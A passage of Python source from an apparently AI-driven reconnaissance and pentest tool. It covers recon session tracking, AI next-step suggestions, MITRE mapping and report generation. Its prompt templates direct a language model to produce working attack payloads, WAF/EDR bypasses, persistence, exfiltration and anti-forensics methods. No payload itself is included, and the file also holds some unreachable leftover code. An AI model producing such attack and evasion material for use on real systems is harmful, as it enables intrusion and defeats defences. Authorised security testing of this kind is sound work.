Develop intelligence-gathering approaches that support broader OSINT operations.""",
                "planning": """You are a STRATEGIC INTELLIGENCE ANALYST designing comprehensive OSINT operations:
- Create systematic intelligence collection methodologies
- Focus on multiple source verification and intelligence analysis
- Emphasize timeline development and relationship mapping
- Consider attribution analysis and threat actor profiling
- Think about intelligence fusion and pattern recognition
- Focus on actionable intelligence production and strategic insights

Design comprehensive OSINT workflows that produce high-quality, actionable intelligence.""",
            },
        }

        # Get persona-specific prompt, fallback to context default if persona not found
        persona_prompts = personas.get(persona, {})
        return persona_prompts.get(context, self._get_default_prompt(context))

    def _get_default_prompt(self, context: str) -> str:
        """Get default system prompts for contexts"""
        default_prompts = {
            "recon": """You are an expert cybersecurity reconnaissance assistant specializing in:
- Advanced subdomain enumeration and discovery techniques
- Web application security assessment and analysis
- Cloud infrastructure reconnaissance and security
- Vulnerability assessment and exploitation methodologies
- Bug bounty hunting strategies and methodologies
- OSINT and information gathering techniques

Provide detailed, actionable, and professional responses focused on practical security assessment.""",
            "payload": """You are an expert payload developer specializing in:
- Cross-Site Scripting (XSS) in various contexts
- SQL Injection across different database systems
- Local/Remote File Inclusion vulnerabilities
- Server-Side Request Forgery (SSRF) exploitation
- Server-Side Template Injection (SSTI) techniques
- Bypass techniques for WAFs and security controls

Provide working payloads with explanations and context-specific variations.""",
            "planning": """You are an expert reconnaissance strategist specializing in:
- Comprehensive security assessment methodologies
- Tool selection and optimization for specific targets
- Phased reconnaissance approaches and workflows
- Risk assessment and prioritization techniques
- Reporting and documentation best practices
- Compliance with responsible disclosure principles

Provide structured, phase-based reconnaissance plans with specific tools and techniques.""",
        }
        return default_prompts.get(context, default_prompts["recon"])

    def generate_attack_flow(
        self,
        attack_types: List[str],
        technique: Optional[str] = None,
        target: Optional[str] = None,
        persona: Optional[str] = None,
    ) -> Dict:
        """Generate sophisticated multi-stage attack flow combining multiple vulnerabilities"""

        # Validate attack types
        valid_attacks = list(self.payload_categories.keys())
        invalid_attacks = [a for a in attack_types if a not in valid_attacks]
        if invalid_attacks:
            return {
                "error": f"Invalid attack types: {invalid_attacks}. Valid: {valid_attacks}"
            }

        # Build comprehensive attack flow prompt
        attack_chain_prompt = f"""
        Design a sophisticated multi-stage attack flow combining these vulnerability types:
        Attack Types: {", ".join(attack_types)}
        Specific Technique: {technique or "adaptive"}
        Target: {target or "generic web application"}

        Create a comprehensive attack flow that:
        1. Shows logical progression from initial reconnaissance to full compromise
        2. Demonstrates how each vulnerability type builds upon previous discoveries
        3. Provides specific payloads and exploitation techniques for each stage
        4. Includes evasion and persistence strategies
        5. Maps to MITRE ATT&CK framework where applicable
        6. Shows potential impact and business consequences

        Format as a detailed attack chain with:
        - Stage-by-stage breakdown
        - Prerequisites for each stage
        - Specific payloads and commands
        - Expected outcomes and next steps
        - Risk assessment and impact analysis

        Focus on realistic, practical exploitation scenarios.
        """

        ai_response = self.ask_ai(
            attack_chain_prompt, context="payload", persona=persona
        )

        # Generate specific payloads for each attack type
        attack_payloads = {}
        for attack_type in attack_types:
            payload_data = self.generate_payload(
                attack_type, technique=technique, persona=persona
            )
            attack_payloads[attack_type] = payload_data

        flow_data = {
            "attack_types": attack_types,
            "technique": technique,
            "target": target,
            "persona": persona,
            "generated_at": datetime.now().isoformat(),
            "attack_flow": ai_response,
            "individual_payloads": attack_payloads,
            "mitre_mapping": self._map_to_mitre(attack_types),
            "risk_level": self._assess_attack_risk(attack_types),
        }

        return flow_data

    def _map_to_mitre(self, attack_types: List[str]) -> Dict[str, List[str]]:
        """Map attack types to MITRE ATT&CK framework"""
        mitre_mapping = {
            "xss": [
                "T1055",
                "T1059.007",
                "T1185",
            ],  # Process Injection, JS, Browser Session Hijacking
            "sqli": [
                "T1190",
                "T1078",
                "T1005",
            ],  # Exploit Public App, Valid Accounts, Data from Local System
            "lfi": [
                "T1083",
                "T1005",
                "T1552",
            ],  # File Discovery, Data from Local System, Credentials
            "ssrf": [
                "T1190",
                "T1135",
                "T1046",
            ],  # Exploit Public App, Network Share Discovery, Network Service Scanning
            "ssti": [
                "T1190",
                "T1059",
                "T1068",
            ],  # Exploit Public App, Command Execution, Privilege Escalation
        }

        mapped_techniques = {}
        for attack_type in attack_types:
            mapped_techniques[attack_type] = mitre_mapping.get(attack_type, [])

        return mapped_techniques

    def _assess_attack_risk(self, attack_types: List[str]) -> str:
        """Assess overall risk level of attack combination"""
        risk_scores = {
            "xss": 3,
            "sqli": 5,
            "lfi": 4,
            "ssrf": 4,
            "ssti": 5,
        }

        total_score = sum(risk_scores.get(attack, 2) for attack in attack_types)
        avg_score = total_score / len(attack_types) if attack_types else 0

        if avg_score >= 4.5:
            return "CRITICAL"
        elif avg_score >= 3.5:
            return "HIGH"
        elif avg_score >= 2.5:
            return "MEDIUM"
        else:
            return "LOW"

    def save_chat_history(self, filename: str) -> bool:
        """Save current session chat history to file"""
        if not self.current_session:
            return False

        chat_dir = self.session_dir / "chats"
        chat_dir.mkdir(exist_ok=True)

        chat_file = chat_dir / f"{filename}.json"

        chat_data = {
            "session_id": self.current_session.session_id,
            "target": self.current_session.target,
            "start_time": self.current_session.start_time.isoformat(),
            "saved_at": datetime.now().isoformat(),
            "total_queries": len(self.current_session.queries),
            "chat_history": [
                {"query": q, "response": r}
                for q, r in zip(
                    self.current_session.queries, self.current_session.results
                )
            ],
            "recon_steps": [
                {
                    "step_id": step.step_id,
                    "tool": step.tool,
                    "command": step.command,
                    "timestamp": step.timestamp.isoformat(),
                    "execution_time": step.execution_time,
                    "results": step.results,
                    "success": step.success,
                    "findings_count": step.findings_count,
                    "findings_quality": step.findings_quality,
                    "ai_analysis": step.ai_analysis,
                    "next_suggestions": step.next_suggestions,
                }
                for step in self.current_session.recon_steps
            ],
            "ai_suggestions": self.current_session.ai_suggestions,
            "current_phase": self.current_session.current_phase,
            "completion_percentage": self.current_session.completion_percentage,
            "discovered_assets": self.current_session.discovered_assets,
            "vulnerability_summary": self.current_session.vulnerability_summary,
        }

        try:
            with open(chat_file, "w") as f:
                json.dump(chat_data, f, indent=2)
            return True
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Error saving chat history: {e}")
            return False

    def add_recon_step(
        self,
        tool: str,
        command: str,
        results: Dict[str, Any],
        execution_time: float = 0.0,
        success: bool = True,
    ) -> str:
        """Add reconnaissance step and trigger AI analysis if chatlog mode enabled"""
        if not self.current_session:
            return ""

        step_id = hashlib.md5(
            f"{tool}_{command}_{datetime.now().isoformat()}".encode(),
            usedforsecurity=False,
        ).hexdigest()[:8]

        # Analyze results and determine quality
        findings_count = self._count_findings(results)
        findings_quality = self._assess_findings_quality(results, findings_count)

        recon_step = ReconStep(
            step_id=step_id,
            tool=tool,
            command=command,
            timestamp=datetime.now(),
            execution_time=execution_time,
            results=results,
            success=success,
            findings_count=findings_count,
            findings_quality=findings_quality,
        )

        # Add AI analysis if chatlog mode is enabled
        if self.config.chatlog.enabled and self.config.chatlog.auto_analyze_results:
            recon_step.ai_analysis = self._analyze_recon_step(recon_step)

        self.current_session.recon_steps.append(recon_step)

        # Update discovered assets
        self._update_discovered_assets(results, tool)

        # Update session completion and phase
        self._update_session_progress()

        # Generate next step suggestions if enabled
        if (
            self.config.chatlog.enabled
            and self.config.chatlog.suggest_next_steps
            and len(self.current_session.recon_steps)
            >= self.config.chatlog.min_results_for_analysis
        ):
            suggestions = self._generate_next_step_suggestions()
            recon_step.next_suggestions = suggestions
            self._add_ai_suggestions(suggestions)

        # Save session automatically
        self.save_session()

        return step_id

    def _count_findings(self, results: Dict[str, Any]) -> int:
        """Count significant findings in recon results"""
        count = 0

        # Count based on common result structures
        if isinstance(results, dict):
            # Subdomain results
            if "subdomains" in results:
                count += len(results.get("subdomains", []))

            # Port scan results
            if "open_ports" in results:
                count += len(results.get("open_ports", []))

            # Vulnerability results
            if "vulnerabilities" in results:
                count += len(results.get("vulnerabilities", []))

            # Directory enumeration
            if "directories" in results or "files" in results:
                count += len(results.get("directories", []))
                count += len(results.get("files", []))

            # JavaScript analysis
            if "secrets" in results or "endpoints" in results:
                count += len(results.get("secrets", []))
                count += len(results.get("endpoints", []))

            # CDN/Cloud findings
            if "cdn_detected" in results and results["cdn_detected"]:
                count += 1
            if "cloud_buckets" in results:
                count += len(results.get("cloud_buckets", []))

            # Generic findings
            if "findings" in results:
                count += len(results.get("findings", []))

        return count

    def _assess_findings_quality(self, results: Dict[str, Any], count: int) -> str:
        """Assess quality of findings based on count and content"""
        if count == 0:
            return "low"
        elif count <= 5:
            return "medium"
        elif count <= 20:
            return "high"
        else:
            # Check for critical findings
            critical_indicators = [
                "vulnerabilities",
                "exposed_secrets",
                "admin_panels",
                "backup_files",
                "config_files",
                "database_files",
            ]

            if any(
                indicator in str(results).lower() for indicator in critical_indicators
            ):
                return "critical"

            return "high"

    def _analyze_recon_step(self, step: ReconStep) -> str:
        """Generate AI analysis of reconnaissance step"""
        analysis_prompt = f"""
        Analyze the following reconnaissance step results:

        **Tool Used:** {step.tool}
        **Command:** {step.command}
        **Execution Time:** {step.execution_time:.2f}s
        **Success:** {step.success}
        **Findings Count:** {step.findings_count}
        **Quality Assessment:** {step.findings_quality}

        **Results Summary:**
        {json.dumps(step.results, indent=2)[:2000]}...

        Please provide:
        1. Key insights from these results
        2. Notable security findings or concerns
        3. Patterns or anomalies detected
        4. Attack surface implications
        5. Recommendations for further investigation

        Focus on actionable intelligence and potential security implications.
        """

        analysis = self.ask_ai(
            analysis_prompt, context="recon", persona="pentester", use_cache=True
        )

        return analysis or "AI analysis unavailable"

    def _update_discovered_assets(self, results: Dict[str, Any], tool: str):
        """Update session's discovered assets tracker"""
        if not self.current_session:
            return

        assets = self.current_session.discovered_assets

        # Initialize asset categories if needed
        asset_categories = [
            "subdomains",
            "ips",
            "ports",
            "directories",
            "files",
            "vulnerabilities",
            "secrets",
            "technologies",
            "certificates",
            "cloud_resources",
        ]

        for category in asset_categories:
            if category not in assets:
                assets[category] = []

        # Extract and categorize findings based on tool and results
        if tool in ["subdocli", "dnscli", "permutcli"]:
            if "subdomains" in results:
                assets["subdomains"].extend(results["subdomains"])

        elif tool in ["portcli", "ipscli"]:
            if "open_ports" in results:
                assets["ports"].extend(results["open_ports"])
            if "ips" in results:
                assets["ips"].extend(results["ips"])

        elif tool in ["dirbcli", "urlcli"]:
            if "directories" in results:
                assets["directories"].extend(results["directories"])
            if "files" in results:
                assets["files"].extend(results["files"])

        elif tool in ["vulncli", "vulnsqlicli"]:
            if "vulnerabilities" in results:
                assets["vulnerabilities"].extend(results["vulnerabilities"])

        elif tool in ["jscli", "secretscli"]:
            if "secrets" in results:
                assets["secrets"].extend(results["secrets"])

        elif tool in ["httpcli", "cdncli"]:
            if "technologies" in results:
                assets["technologies"].extend(results["technologies"])

        elif tool in ["cloudcli"]:
            if "cloud_buckets" in results:
                assets["cloud_resources"].extend(results["cloud_buckets"])

        # Remove duplicates
        for category in assets:
            if isinstance(assets[category], list):
                assets[category] = list(set(assets[category]))

    def _update_session_progress(self):
        """Update session completion percentage and current phase"""
        if not self.current_session:
            return

        total_steps = len(self.current_session.recon_steps)
        successful_steps = sum(
            1 for step in self.current_session.recon_steps if step.success
        )

        # Basic completion calculation
        if total_steps > 0:
            self.current_session.completion_percentage = (
                successful_steps / total_steps
            ) * 100

        # Determine current phase based on tools used
        tools_used = [step.tool for step in self.current_session.recon_steps]

        if any(tool in tools_used for tool in ["vulncli", "vulnsqlicli", "nuclei"]):
            self.current_session.current_phase = "vulnerability_assessment"
        elif any(tool in tools_used for tool in ["dirbcli", "jscli", "httpcli"]):
            self.current_session.current_phase = "active_enumeration"
        elif any(tool in tools_used for tool in ["subdocli", "dnscli", "permutcli"]):
            self.current_session.current_phase = "discovery"
        else:
            self.current_session.current_phase = "initial"

    def _generate_next_step_suggestions(self) -> List[Dict[str, Any]]:
        """Generate AI-powered suggestions for next reconnaissance steps"""
        if not self.current_session or len(self.current_session.recon_steps) == 0:
            return []

        # Build context from recent steps
        recent_steps = self.current_session.recon_steps[-5:]  # Last 5 steps
        context_summary = self._build_context_summary(recent_steps)

        suggestion_prompt = f"""
        Based on the reconnaissance session progress for target: {self.current_session.target}

        **Current Phase:** {self.current_session.current_phase}
        **Completion:** {self.current_session.completion_percentage:.1f}%
        **Assets Discovered:** {len(self.current_session.discovered_assets.get('subdomains', []))} subdomains, {len(self.current_session.discovered_assets.get('ports', []))} ports, {len(self.current_session.discovered_assets.get('vulnerabilities', []))} vulnerabilities

        **Recent Steps Summary:**
        {context_summary}

        **Available Tools:** subdocli, dnscli, permutcli, httpcli, dirbcli, jscli, vulncli, vulnsqlicli, portcli, cdncli, cloudcli, secretscli

        Please suggest the next {self.config.chatlog.max_suggestions} most valuable reconnaissance steps:

        1. Consider what has already been discovered
        2. Identify gaps in current reconnaissance coverage
        3. Prioritize high-impact, logical next steps
        4. Focus on deepening analysis of promising findings
        5. Consider tool synergy and workflow efficiency

        Format each suggestion as:
        COMMAND: [specific reconcli command]
        REASONING: [brief explanation why this step is valuable]
        PRIORITY: [high/medium/low]
        CONFIDENCE: [0.0-1.0 confidence score]
        """

        ai_response = self.ask_ai(
            suggestion_prompt, context="planning", persona="pentester", use_cache=True
        )

        if not ai_response:
            return self._get_fallback_suggestions()

        # Extract and structure command suggestions from AI response
        suggestions = self._extract_structured_suggestions(ai_response)

        return suggestions[: self.config.chatlog.max_suggestions]

    def _build_context_summary(self, steps: List[ReconStep]) -> str:
        """Build context summary from recent reconnaissance steps"""
        summary_parts = []

        for step in steps:
            status = "✅" if step.success else "❌"
            summary_parts.append(
                f"{status} {step.tool}: {step.findings_count} findings ({step.findings_quality} quality)"
            )

        return "\n".join(summary_parts)

    def _extract_command_suggestions(self, ai_response: str) -> List[str]:
        """Extract specific command suggestions from AI response"""
        suggestions = []
        lines = ai_response.split("\n")

        for line in lines:
            line = line.strip()
            # Look for lines that contain reconcli commands
            if "reconcli" in line.lower() or any(
                tool in line.lower()
                for tool in [
                    "subdocli",
                    "dnscli",
                    "permutcli",
                    "httpcli",
                    "dirbcli",
                    "jscli",
                    "vulncli",
                    "vulnsqlicli",
                    "portcli",
                    "cdncli",
                    "cloudcli",
                ]
            ):
                # Clean up the suggestion
                if ":" in line:
                    suggestion = line.split(":", 1)[1].strip()
                else:
                    suggestion = line

                if suggestion and len(suggestion) > 10:
                    suggestions.append(suggestion)

        return suggestions

    def _extract_structured_suggestions(self, ai_response: str) -> List[Dict[str, Any]]:
        """Extract structured command suggestions from AI response"""
        suggestions = []
        lines = ai_response.split("\n")

        current_suggestion = {}

        for line in lines:
            line = line.strip()

            if line.startswith("COMMAND:"):
                if current_suggestion and "command" in current_suggestion:
                    suggestions.append(current_suggestion)
                    current_suggestion = {}
                current_suggestion["command"] = line.replace("COMMAND:", "").strip()

            elif line.startswith("REASONING:"):
                current_suggestion["reasoning"] = line.replace("REASONING:", "").strip()

            elif line.startswith("PRIORITY:"):
                priority = line.replace("PRIORITY:", "").strip().lower()
                current_suggestion["priority"] = priority

            elif line.startswith("CONFIDENCE:"):
                try:
                    confidence_str = line.replace("CONFIDENCE:", "").strip()
                    current_suggestion["confidence"] = float(confidence_str)
                except ValueError:
                    current_suggestion["confidence"] = 0.7  # default

        # Add the last suggestion if it exists
        if current_suggestion and "command" in current_suggestion:
            suggestions.append(current_suggestion)

        # Ensure all suggestions have required fields
        structured_suggestions = []
        for suggestion in suggestions:
            if "command" not in suggestion:
                continue

            structured_suggestion = {
                "command": suggestion.get("command", ""),
                "reasoning": suggestion.get("reasoning", "AI-recommended next step"),
                "priority": suggestion.get("priority", "medium"),
                "confidence": suggestion.get("confidence", 0.7),
            }
            structured_suggestions.append(structured_suggestion)

        return structured_suggestions

    def _get_fallback_suggestions(self) -> List[Dict[str, Any]]:
        """Get fallback suggestions when AI is unavailable"""
        if not self.current_session:
            return []

        current_tools = [step.tool for step in self.current_session.recon_steps]
        target = self.current_session.target

        fallback_suggestions = []

        # Basic progression logic
        if "subdocli" not in current_tools:
            fallback_suggestions.append(
                {
                    "command": f"reconcli subdocli --domain {target} --bbot --export json",
                    "reasoning": "Start with comprehensive subdomain enumeration",
                    "priority": "high",
                    "confidence": 0.9,
                }
            )

        if "httpcli" not in current_tools and "subdocli" in current_tools:
            fallback_suggestions.append(
                {
                    "command": f"reconcli httpcli --input subdomains.txt --tech-detect --security-scan",
                    "reasoning": "Analyze discovered subdomains for technologies and vulnerabilities",
                    "priority": "high",
                    "confidence": 0.8,
                }
            )

        if "dirbcli" not in current_tools and "httpcli" in current_tools:
            fallback_suggestions.append(
                {
                    "command": f"reconcli dirbcli --target {target} --wordlist-size large",
                    "reasoning": "Enumerate directories and files for attack surface expansion",
                    "priority": "medium",
                    "confidence": 0.7,
                }
            )

        if "jscli" not in current_tools:
            fallback_suggestions.append(
                {
                    "command": f"reconcli jscli --target {target} --secret-detection --ai-mode",
                    "reasoning": "Analyze JavaScript files for secrets and vulnerabilities",
                    "priority": "medium",
                    "confidence": 0.6,
                }
            )

        if "vulncli" not in current_tools:
            fallback_suggestions.append(
                {
                    "command": f"reconcli vulncli --target {target} --comprehensive",
                    "reasoning": "Perform comprehensive vulnerability scanning",
                    "priority": "high",
                    "confidence": 0.8,
                }
            )

        return fallback_suggestions[: self.config.chatlog.max_suggestions]

    def _add_ai_suggestions(self, suggestions: List[Dict[str, Any]]):
        """Add AI suggestions to session tracking"""
        if not self.current_session:
            return

        suggestion_entry = {
            "timestamp": datetime.now().isoformat(),
            "suggestions": suggestions,
            "context": f"After {len(self.current_session.recon_steps)} steps",
            "phase": self.current_session.current_phase,
        }

        self.current_session.ai_suggestions.append(suggestion_entry)

    def get_chatlog_driven_recommendations(
        self, max_suggestions: int = 5
    ) -> Dict[str, Any]:
        """Get comprehensive chatlog-driven reconnaissance recommendations"""
        if not self.current_session or not self.config.chatlog.enabled:
            return {"error": "Chatlog mode not enabled or no active session"}

        # Generate comprehensive analysis
        analysis_prompt = f"""
        Perform comprehensive analysis of the reconnaissance session for: {self.current_session.target}

        **Session Overview:**
        - Duration: {(datetime.now() - self.current_session.start_time).total_seconds() / 60:.1f} minutes
        - Steps Completed: {len(self.current_session.recon_steps)}
        - Current Phase: {self.current_session.current_phase}
        - Completion: {self.current_session.completion_percentage:.1f}%

        **Assets Discovered:**
        - Subdomains: {len(self.current_session.discovered_assets.get('subdomains', []))}
        - IPs: {len(self.current_session.discovered_assets.get('ips', []))}
        - Open Ports: {len(self.current_session.discovered_assets.get('ports', []))}
        - Directories: {len(self.current_session.discovered_assets.get('directories', []))}
        - Vulnerabilities: {len(self.current_session.discovered_assets.get('vulnerabilities', []))}
        - Secrets: {len(self.current_session.discovered_assets.get('secrets', []))}

        **Recent Steps:**
        {self._build_detailed_steps_summary()}

        Based on this comprehensive analysis, provide:

        1. **Strategic Assessment:** Overall reconnaissance quality and coverage gaps
        2. **Priority Recommendations:** Top {max_suggestions} next steps with specific tools and rationale
        3. **Attack Surface Analysis:** Key areas of potential vulnerability
        4. **Efficiency Insights:** Workflow optimization suggestions
        5. **Risk Assessment:** Current security posture evaluation

        Focus on actionable, high-impact recommendations that advance the reconnaissance goals.
        """

        ai_analysis = self.ask_ai(
            analysis_prompt, context="planning", persona="pentester", use_cache=False
        )

        # Generate specific next steps
        next_suggestions = self._generate_next_step_suggestions()

        return {
            "session_id": self.current_session.session_id,
            "target": self.current_session.target,
            "analysis_timestamp": datetime.now().isoformat(),
            "comprehensive_analysis": ai_analysis,
            "next_step_suggestions": next_suggestions[:max_suggestions],
            "session_metrics": {
                "total_steps": len(self.current_session.recon_steps),
                "successful_steps": sum(
                    1 for step in self.current_session.recon_steps if step.success
                ),
                "current_phase": self.current_session.current_phase,
                "completion_percentage": self.current_session.completion_percentage,
                "session_duration_minutes": (
                    datetime.now() - self.current_session.start_time
                ).total_seconds()
                / 60,
            },
            "discovered_assets_summary": {
                category: len(assets)
                for category, assets in self.current_session.discovered_assets.items()
            },
            "recommendations_confidence": (
                "high"
                if len(self.current_session.recon_steps)
                >= self.config.chatlog.min_results_for_analysis
                else "medium"
            ),
        }

    def _build_detailed_steps_summary(self) -> str:
        """Build detailed summary of all reconnaissance steps"""
        if not self.current_session:
            return ""

        summary_parts = []
        for i, step in enumerate(
            self.current_session.recon_steps[-10:], 1
        ):  # Last 10 steps
            status = "✅" if step.success else "❌"
            summary_parts.append(
                f"{i}. {status} {step.tool} ({step.execution_time:.1f}s): "
                f"{step.findings_count} findings ({step.findings_quality})"
            )
            if step.ai_analysis:
                # Include brief AI analysis
                summary_parts.append(f"   AI: {step.ai_analysis[:100]}...")

        return "\n".join(summary_parts)

    def enable_chatlog_mode(
        self,
        auto_analyze: bool = True,
        suggest_next: bool = True,
        min_results: int = 3,
        max_suggestions: int = 5,
    ) -> bool:
        """Enable chatlog-driven reconnaissance mode"""
        self.config.chatlog.enabled = True
        self.config.chatlog.auto_analyze_results = auto_analyze
        self.config.chatlog.suggest_next_steps = suggest_next
        self.config.chatlog.min_results_for_analysis = min_results
        self.config.chatlog.max_suggestions = max_suggestions

        if self.config.verbose_logging:
            print("🧠 Chatlog-driven recon mode enabled")
            print(f"   Auto-analyze: {auto_analyze}")
            print(f"   Auto-suggest: {suggest_next}")
            print(f"   Min results: {min_results}")
            print(f"   Max suggestions: {max_suggestions}")

        return True

    def disable_chatlog_mode(self) -> bool:
        """Disable chatlog-driven reconnaissance mode"""
        self.config.chatlog.enabled = False

        if self.config.verbose_logging:
            print("🧠 Chatlog-driven recon mode disabled")

        return True

    def get_session_insights(self) -> Dict[str, Any]:
        """Get comprehensive insights about the current reconnaissance session"""
        if not self.current_session:
            return {"error": "No active session"}

        # Calculate metrics
        total_steps = len(self.current_session.recon_steps)
        successful_steps = sum(
            1 for step in self.current_session.recon_steps if step.success
        )
        total_findings = sum(
            step.findings_count for step in self.current_session.recon_steps
        )

        # Tool usage analysis
        tool_usage = {}
        for step in self.current_session.recon_steps:
            tool_usage[step.tool] = tool_usage.get(step.tool, 0) + 1

        # Quality distribution
        quality_distribution = {"low": 0, "medium": 0, "high": 0, "critical": 0}
        for step in self.current_session.recon_steps:
            quality_distribution[step.findings_quality] += 1

        # Performance metrics
        avg_execution_time = (
            sum(step.execution_time for step in self.current_session.recon_steps)
            / total_steps
            if total_steps > 0
            else 0
        )

        return {
            "session_overview": {
                "session_id": self.current_session.session_id,
                "target": self.current_session.target,
                "start_time": self.current_session.start_time.isoformat(),
                "duration_minutes": (
                    datetime.now() - self.current_session.start_time
                ).total_seconds()
                / 60,
                "current_phase": self.current_session.current_phase,
                "completion_percentage": self.current_session.completion_percentage,
            },
            "execution_metrics": {
                "total_steps": total_steps,
                "successful_steps": successful_steps,
                "success_rate": (
                    (successful_steps / total_steps * 100) if total_steps > 0 else 0
                ),
                "total_findings": total_findings,
                "avg_execution_time": avg_execution_time,
            },
            "tool_usage": tool_usage,
            "quality_distribution": quality_distribution,
            "discovered_assets": {
                category: len(assets)
                for category, assets in self.current_session.discovered_assets.items()
            },
            "ai_suggestions_count": len(self.current_session.ai_suggestions),
            "chatlog_enabled": self.config.chatlog.enabled,
        }

        try:
            with open(chat_file, "w") as f:
                json.dump(chat_data, f, indent=2)
            return True
        except Exception:
            return False

    def load_chat_history(self, filename: str) -> bool:
        """Load chat history from file"""
        chat_dir = self.session_dir / "chats"
        chat_file = chat_dir / f"{filename}.json"

        if not chat_file.exists():
            return False

        try:
            with open(chat_file, "r") as f:
                chat_data = json.load(f)

            # Create session from chat history
            self.current_session = ReconSession(
                session_id=chat_data["session_id"],
                target=chat_data["target"],
                start_time=datetime.fromisoformat(chat_data["start_time"]),
                queries=[item["query"] for item in chat_data["chat_history"]],
                results=[item["response"] for item in chat_data["chat_history"]],
            )

            return True
        except Exception:
            return False

    def list_chat_files(self) -> List[str]:
        """List available chat history files"""
        chat_dir = self.session_dir / "chats"
        if not chat_dir.exists():
            return []

        return [f.stem for f in chat_dir.glob("*.json")]

    def enable_prompt_mode(self) -> None:
        """Enable advanced prompt mode with specialized templates"""
        self.prompt_mode = True
        self.prompt_templates = {
            "recon_deep": """
            Perform DEEP reconnaissance analysis for: {target}

            Requirements:
            - Exhaustive subdomain enumeration strategies
            - Advanced DNS techniques and zone walking
            - Infrastructure fingerprinting and technology detection
            - Cloud service discovery and misconfigurations
            - Social engineering intelligence gathering
            - Historical data analysis and wayback machine research

            Provide comprehensive methodology with specific tools and techniques.
            """,
            "exploit_chain": """
            Design EXPLOITATION CHAIN for: {vulnerabilities}

            Requirements:
            - Multi-stage attack progression
            - Privilege escalation opportunities
            - Persistence mechanisms
            - Data exfiltration methods
            - Anti-forensics and cleanup procedures
            - Real-world impact demonstration

            Focus on practical, executable attack sequences.
            """,
            "evasion_advanced": """
            Develop ADVANCED EVASION techniques for: {context}

            Requirements:
            - WAF/IPS/EDR bypass methods
            - Polymorphic payload generation
            - Traffic obfuscation and tunneling
            - Timing and behavioral evasion
            - Living-off-the-land techniques
            - Anti-analysis and sandbox evasion

            Provide cutting-edge evasion methodologies.
            """,
            "threat_modeling": """
            Conduct THREAT MODELING for: {target}

            Requirements:
            - Attack surface analysis
            - Threat actor profiling
            - Attack vector identification
            - Risk prioritization matrix
            - Mitigation strategies
            - Incident response considerations

            Deliver comprehensive security assessment framework.
            """,
        }

    def generate_report_from_flow(
        self, json_file_path: str, persona: Optional[str] = None
    ) -> Dict:
        """Professional security assessment report generation from attack flow data.

        Transforms attack flow JSON files into comprehensive, persona-specific security
        reports suitable for executive briefings, technical documentation, compliance
        audits, and vulnerability management programs.

        Args:
            json_file_path (str): Path to attack flow JSON file containing:
                                - attack_types: List of vulnerability types discovered
                                - attack_flow: Multi-stage attack chain data
                                - mitre_mapping: MITRE ATT&CK technique mapping
                                - vulnerabilities: Detailed vulnerability information
                                - impact_assessment: Business impact analysis
                                - remediation: Security improvement recommendations
                                - timeline: Attack progression timeline
                                - evidence: Supporting evidence and artifacts

            persona (Optional[str]): Report perspective and target audience
                                   - "pentester": Technical penetration test report
                                   - "redteam": Red team operation summary
                                   - "bugbounty": Bug bounty submission format
                                   - "compliance": Regulatory compliance assessment
                                   - "executive": C-level executive summary
                                   - "technical": Engineering team detailed report
                                   - "auditor": Internal/external audit format
                                   - "researcher": Academic/research publication

        Returns:
            Dict: Comprehensive professional security report
                {
                    "report_metadata": {
                        "report_id": str,                    # Unique report identifier
                        "generation_timestamp": str,         # ISO 8601 timestamp
                        "report_type": str,                  # Report classification
                        "persona_used": str,                 # Target audience
                        "classification_level": str,        # Confidentiality level
                        "version": str,                      # Report version
                        "author": str,                       # Generated by AI indicator
                        "review_status": str,                # Draft/Final status
                        "distribution_list": List[str],      # Intended recipients
                        "retention_period": str              # Data retention policy
                    },
                    "executive_summary": {
                        "assessment_overview": str,          # High-level findings
                        "critical_findings": List[str],      # Most severe issues
                        "business_impact": str,              # Risk to organization
                        "recommendations_summary": List[str], # Key action items
                        "risk_rating": str,                  # Overall risk score
                        "compliance_status": str,            # Regulatory compliance
                        "remediation_timeline": str,         # Required fix timeframe
                        "investment_required": str           # Resource requirements
                    },
                    "attack_analysis": {
                        "attack_surface_summary": str,       # Attack surface overview
                        "vulnerability_distribution": Dict[str, int], # Vuln by severity
                        "attack_vectors": List[Dict],        # Entry points identified
                        "exploitation_chains": List[Dict],   # Multi-stage attacks
                        "privilege_escalation_paths": List[Dict], # Escalation routes
                        "lateral_movement_analysis": str,    # Network movement
                        "data_exfiltration_risks": List[str], # Data theft scenarios
                        "persistence_mechanisms": List[str], # Maintaining access
                        "detection_evasion": List[str]       # Security bypass methods
                    },
                    "technical_findings": {
                        "vulnerabilities": [
                            {
                                "vulnerability_id": str,     # CVE or internal ID
                                "title": str,                # Vulnerability name
                                "severity": str,             # Critical/High/Medium/Low
                                "cvss_score": float,         # CVSS 3.1 score
                                "description": str,          # Technical description
                                "affected_systems": List[str], # Impacted assets
                                "exploit_scenario": str,     # Attack walkthrough
                                "evidence": List[str],       # Proof of concept
                                "remediation": str,          # Fix recommendations
                                "timeline": str,             # Discovery timeline
                                "references": List[str]      # CVE/research links
                            }
                        ],
                        "attack_chains": List[Dict],         # Complex attack scenarios
                        "security_controls_bypassed": List[str], # Defeated protections
                        "false_positives": List[str],        # Excluded findings
                        "testing_limitations": List[str]     # Assessment constraints
                    },
                    "mitre_attack_mapping": {
                        "tactics_observed": List[str],       # MITRE tactics used
                        "techniques_demonstrated": List[Dict], # Specific techniques
                        "sub_techniques": List[str],         # Detailed sub-techniques
                        "detection_coverage": Dict[str, str], # Detection capabilities
                        "threat_actor_similarity": List[str], # Similar APT groups
                        "defensive_gaps": List[str],         # Missing protections
                        "purple_team_scenarios": List[Dict], # Testing scenarios
                        "ioc_patterns": List[str]            # Indicators of compromise
                    },
                    "risk_assessment": {
                        "risk_matrix": Dict[str, str],       # Risk scoring matrix
                        "business_impact_analysis": str,     # Financial/operational impact
                        "threat_likelihood": str,            # Probability assessment
                        "attack_complexity": str,            # Difficulty analysis
                        "asset_criticality": List[Dict],     # Asset value assessment
                        "regulatory_implications": List[str], # Compliance impact
                        "reputational_risk": str,            # Brand damage potential
                        "competitive_intelligence": str      # Intelligence value
                    },
                    "remediation_roadmap": {
                        "immediate_actions": [
                            {
                                "action": str,               # Required action
                                "priority": str,             # Critical/High/Medium/Low
                                "estimated_effort": str,     # Time/resource estimate
                                "responsible_team": str,     # Assignment
                                "dependencies": List[str],   # Prerequisites
                                "success_criteria": str,     # Completion definition
                                "validation_method": str,    # How to verify fix
                                "timeline": str              # Completion deadline
                            }
                        ],
                        "strategic_improvements": List[Dict], # Long-term enhancements
                        "process_improvements": List[str],   # Procedural changes
                        "technology_investments": List[str], # Tool/system upgrades
                        "training_requirements": List[str],  # Staff education needs
